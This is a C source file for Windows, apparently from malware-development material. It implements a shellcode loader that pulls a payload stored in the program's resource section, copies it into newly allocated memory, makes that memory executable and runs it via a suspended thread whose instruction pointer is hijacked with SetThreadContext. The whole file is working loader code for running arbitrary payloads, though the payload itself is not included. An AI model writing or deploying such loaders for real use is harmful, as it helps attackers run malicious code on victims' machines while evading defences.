#include <Windows.h>
#include <stdio.h>
#include "shellcode.h"
#include "resource.h"


void LocalExecute() {
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;


	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_AAAA1), L"AAAA");
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return;
	}

	// Virtual Alloc to allocate memory for our payload
	PVOID pAllocatedMemory = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy the payload to the allocated memory
	RtlCopyMemory(pAllocatedMemory, pPayloadAddress, sPayloadSize);

	// Change the memory protection to PAGE_EXECUTE_READ
	DWORD dwOldProtect;
	VirtualProtect(pAllocatedMemory, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect);

	// Execute the payload
	((void(*)())pAllocatedMemory)();
}

int InjectLocalThread() {
	// create a new thread in suspend state
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LocalExecute, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return 1;
	}

	// retrive thread context
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, &ctx)) {
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return 1;
	}
	// set the thread's instruction pointer to the payload
	ctx.Rip = (DWORD64)LocalExecute;

	// set the thread's context
	if (!SetThreadContext(hThread, &ctx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return 1;
	}

	// resume the thread
	if (ResumeThread(hThread) == -1) {
		printf("[!] ResumeThread Failed With Error : %d \n", GetLastError());
		return 1;
	}

	// wait for thread
	WaitForSingleObject(hThread, INFINITE);

	return 0;
}


int main(int argc, char* argv[]) {
	InjectLocalThread();
}